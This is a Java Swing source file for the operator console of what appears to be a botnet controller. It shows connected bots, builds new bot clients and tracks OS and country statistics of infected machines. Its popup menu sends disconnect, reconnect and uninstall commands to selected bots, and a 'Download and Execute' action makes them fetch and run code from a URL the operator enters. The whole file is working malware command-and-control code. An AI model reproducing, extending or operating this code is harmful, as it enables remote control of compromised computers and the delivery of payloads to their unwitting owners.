package com.redpois0n.ui;

import java.awt.Color;
import java.awt.Component;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.util.ArrayList;
import java.util.List;

import javax.swing.BorderFactory;
import javax.swing.DefaultListModel;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JColorChooser;
import javax.swing.JComponent;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JList;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;
import javax.swing.border.EmptyBorder;
import javax.swing.text.Document;

import com.redpois0n.bot.Bot;
import com.redpois0n.bot.Main;
import com.redpois0n.commands.Commands;
import com.redpois0n.common.packets.Headers;
import com.redpois0n.ui.renderers.BotListRenderer;
import com.redpois0n.ui.stats.CountryStats;
import com.redpois0n.ui.stats.OsStats;

@SuppressWarnings({ "serial", "rawtypes", "unchecked" })
public class Frame extends JFrame {

	/**
	 * Controls
	 */
	private JPanel contentPane;
	private JTextArea txtCommand;
	private JTextArea txtLog;
	private JList listBots;
	private DefaultListModel model;
	private JMenuBar menuBar;
	private JMenu mnBot;
	private JMenu mnColors;
	private JMenuItem mntmLogForeground;
	private JMenuItem mntmLogBackground;
	private JMenuItem mntmReset;
	private JLabel lblCount;
	private JPopupMenu popupMenu;
	private JMenuItem mntmDisconnect;
	private JMenuItem mntmReconnect;
	private JMenuItem mntmExit;
	private JMenuItem mntmUninstall;
	private String latestCommand;
	private JMenu mnStatistic;
	private JMenuItem mntmBuild;
	private JMenuItem mntmOsStatistics;
	private JMenuItem mntmCountryStatistics;
	private JMenuItem mntmDownloadAndExecute;

	public Frame() {
		addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent arg0) {
				if (Main.isStats) {
					try {
						OsStats.save();
						CountryStats.save();
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			}
		});
		Main.formatTitle(this);
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		setBounds(100, 100, 659, 420);
		
		menuBar = new JMenuBar();
		setJMenuBar(menuBar);
		
		mnBot = new JMenu("Bot");
		menuBar.add(mnBot);
		
		mntmExit = new JMenuItem("Exit");
		mntmExit.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				System.exit(0);
			}
		});
		
		mntmBuild = new JMenuItem("Build");
		mntmBuild.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				new FrameBuild().setVisible(true);
			}
		});
		mnBot.add(mntmBuild);
		mnBot.add(mntmExit);
		
		mnColors = new JMenu("Colors");
		menuBar.add(mnColors);
		
		mntmLogForeground = new JMenuItem("Log Foreground");
		mntmLogForeground.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				setForeground(txtLog);
				txtCommand.setForeground(txtLog.getForeground());
			}
		});
		mnColors.add(mntmLogForeground);
		
		mntmLogBackground = new JMenuItem("Log Background");
		mntmLogBackground.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				setBackground(txtLog);
				txtCommand.setBackground(txtLog.getBackground());
			}
		});
		mnColors.add(mntmLogBackground);
		
		mnColors.addSeparator();
		
		mntmReset = new JMenuItem("Reset");
		mntmReset.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				txtCommand.setBackground(Color.white);
				txtCommand.setForeground(Color.black);
				
				txtLog.setBackground(Color.white);
				txtLog.setForeground(Color.black);
			}
		});
		mnColors.add(mntmReset);
		
		mnStatistic = new JMenu("Statistic");
		menuBar.add(mnStatistic);
		
		mntmOsStatistics = new JMenuItem("OS Statistics");
		mntmOsStatistics.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				new FrameOsStats().setVisible(true);
			}
		});
		mnStatistic.add(mntmOsStatistics);
		
		mntmCountryStatistics = new JMenuItem("Country Statistics");
		mntmCountryStatistics.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				new FrameCountryStats().setVisible(true);
			}
		});
		mnStatistic.add(mntmCountryStatistics);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);
		
		JScrollPane scrollPaneLog = new JScrollPane();
		scrollPaneLog.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		
		JScrollPane scrollPane_1 = new JScrollPane();
		scrollPane_1.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		
		JPanel panel = new JPanel();
		panel.setBorder(BorderFactory.createLineBorder(Color.gray));
		
		JScrollPane scrollPaneInput = new JScrollPane();
		scrollPaneInput.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_NEVER);
		scrollPaneInput.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_NEVER);
		GroupLayout gl_contentPane = new GroupLayout(contentPane);
		gl_contentPane.setHorizontalGroup(
			gl_contentPane.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_contentPane.createSequentialGroup()
					.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
						.addComponent(scrollPaneLog, GroupLayout.DEFAULT_SIZE, 442, Short.MAX_VALUE)
						.addGroup(gl_contentPane.createSequentialGroup()
							.addGap(1)
							.addComponent(scrollPaneInput, GroupLayout.DEFAULT_SIZE, 441, Short.MAX_VALUE)))
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
						.addComponent(scrollPane_1, GroupLayout.DEFAULT_SIZE, 182, Short.MAX_VALUE)
						.addComponent(panel, GroupLayout.DEFAULT_SIZE, 182, Short.MAX_VALUE))
					.addGap(3))
		);
		gl_contentPane.setVerticalGroup(
			gl_contentPane.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_contentPane.createSequentialGroup()
					.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
						.addGroup(gl_contentPane.createSequentialGroup()
							.addComponent(scrollPaneLog, GroupLayout.DEFAULT_SIZE, 325, Short.MAX_VALUE)
							.addPreferredGap(ComponentPlacement.RELATED)
							.addComponent(scrollPaneInput, GroupLayout.PREFERRED_SIZE, 20, GroupLayout.PREFERRED_SIZE))
						.addGroup(gl_contentPane.createSequentialGroup()
							.addComponent(scrollPane_1, GroupLayout.DEFAULT_SIZE, 175, Short.MAX_VALUE)
							.addGap(7)
							.addComponent(panel, GroupLayout.PREFERRED_SIZE, 169, GroupLayout.PREFERRED_SIZE)))
					.addGap(0))
		);
		
		JLabel lblBotsConnected = new JLabel("Bots Connected:");
		
		lblCount = new JLabel("0");
		GroupLayout gl_panel = new GroupLayout(panel);
		gl_panel.setHorizontalGroup(
			gl_panel.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_panel.createSequentialGroup()
					.addContainerGap()
					.addComponent(lblBotsConnected)
					.addGap(7)
					.addComponent(lblCount)
					.addContainerGap(37, Short.MAX_VALUE))
		);
		gl_panel.setVerticalGroup(
			gl_panel.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_panel.createSequentialGroup()
					.addContainerGap()
					.addGroup(gl_panel.createParallelGroup(Alignment.LEADING)
						.addComponent(lblBotsConnected)
						.addComponent(lblCount))
					.addContainerGap(142, Short.MAX_VALUE))
		);
		panel.setLayout(gl_panel);
		
		txtCommand = new JTextArea();
		scrollPaneInput.setViewportView(txtCommand);
		txtCommand.addKeyListener(new KeyAdapter() {
			@Override
			public void keyReleased(KeyEvent arg0) {
				if (arg0.getKeyCode() == KeyEvent.VK_ENTER) {
					String command = txtCommand.getText();
					txtCommand.setText("");
					try {
						Commands.execute(command.trim());
						latestCommand = command;
					} catch (Exception e) {
						Main.handleException(e);
					}
				} else if (arg0.getKeyCode() == KeyEvent.VK_UP) {
					if (latestCommand != null) {
						txtCommand.setText(latestCommand);
					}
				}
			}
		});
		txtCommand.setLineWrap(true);
		
		txtLog = new JTextArea();
		txtLog.setEditable(false);
		scrollPaneLog.setViewportView(txtLog);
		
		model = new DefaultListModel();
		listBots = new JList(model);
		listBots.setCellRenderer(new BotListRenderer());
		scrollPane_1.setViewportView(listBots);
		
		popupMenu = new JPopupMenu();
		addPopup(listBots, popupMenu);
		
		mntmDisconnect = new JMenuItem("Disconnect");
		mntmDisconnect.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				for (Bot bot : getSelectedBots()) {
					bot.writeHandledByte(Headers.PACKET_DISCONNECT);
				}
			}
		});
		popupMenu.add(mntmDisconnect);
		
		mntmReconnect = new JMenuItem("Reconnect");
		mntmReconnect.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				for (Bot bot : getSelectedBots()) {
					bot.writeHandledByte(Headers.PACKET_RECONNECT);
				}
			}
		});
		popupMenu.add(mntmReconnect);
		
		mntmUninstall = new JMenuItem("Uninstall");
		mntmUninstall.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				for (Bot bot : getSelectedBots()) {
					bot.writeHandledByte(Headers.PACKET_UNINSTALL);
				}
			}
		});
		popupMenu.add(mntmUninstall);
		
		mntmDownloadAndExecute = new JMenuItem("Download and Execute");
		mntmDownloadAndExecute.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				String url = JOptionPane.showInputDialog(null, "Input URL", "Download and Execute", JOptionPane.QUESTION_MESSAGE);
				
				if (url == null) {
					return;
				}
				
				for (Bot bot : getSelectedBots()) {
					try {
						bot.writeByte(Headers.PACKET_DOWNLOAD_EXECUTE);
						bot.writeString(url.trim());
					} catch (Exception ex) {
						Main.handleException(ex);
					}
				}
			}
		});
		popupMenu.add(mntmDownloadAndExecute);
		contentPane.setLayout(gl_contentPane);
		
		
	}

	public synchronized void addBot(Bot bot) {
		model.addElement(bot);
		
		updateCount();
	}
	
	public synchronized void removeBot(Bot bot) {
		model.removeElement(bot);
		
		updateCount();
	}

	/**
	 * Logs to the text area
	 * @param s
	 */
	public synchronized void log(String s) {
		Document document = txtLog.getDocument();
		
		try {
			document.insertString(document.getLength(), s + "\n\r", null);
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		txtLog.setSelectionStart(document.getLength());
		txtLog.setSelectionEnd(document.getLength());
	}
	
	/**
	 * Updates the global bot count
	 */
	public void updateCount() {
		lblCount.setText(Integer.toString(Main.bots.size()));
		
		Main.formatTitle(this);
	}
	
	/**
	 * Sets foreground for component
	 * @param component
	 */
	public void setForeground(JComponent component) {
		Color c = JColorChooser.showDialog(null, "Choose Color", component.getForeground());
		
		if (!c.equals(component.getForeground())) {
			component.setForeground(c);
		}
		
	}
	
	/**
	 * Sets background for component
	 * @param component
	 */
	public void setBackground(JComponent component) {
		Color c = JColorChooser.showDialog(null, "Choose Color", component.getBackground());
		
		if (!c.equals(component.getBackground())) {
			component.setBackground(c);
		}
	}
	
	/**
	 * Returns bots selected from the JList
	 * @return Array of selected bots
	 */
	public Bot[] getSelectedBots() {
		Object[] array = listBots.getSelectedValuesList().toArray();
		List<Bot> list = new ArrayList<Bot>();
		
		for (Object obj : array) {
			for (int i = 0; i < Main.bots.size(); i++) {
				try {
					Bot bot = Main.bots.get(i);
					if (bot.toString().equals(obj.toString())) {
						list.add(bot);
						continue;
					}
				} catch (Exception ex) {
					Main.handleException(ex);
					break;
				}
			}
		}
		
		return list.toArray(new Bot[0]);
	}
	
	/**
	 * Clears log
	 */
	public void clear() {
		txtLog.setText("");
	}
	
	/**
	 * WindowBuilder JPopupMenu generated code
	 * @param component
	 * @param popup
	 */
	private static void addPopup(Component component, final JPopupMenu popup) {
		component.addMouseListener(new MouseAdapter() {
			public void mousePressed(MouseEvent e) {
				if (e.isPopupTrigger()) {
					showMenu(e);
				}
			}
			public void mouseReleased(MouseEvent e) {
				if (e.isPopupTrigger()) {
					showMenu(e);
				}
			}
			private void showMenu(MouseEvent e) {
				popup.show(e.getComponent(), e.getX(), e.getY());
			}
		});
	}
}
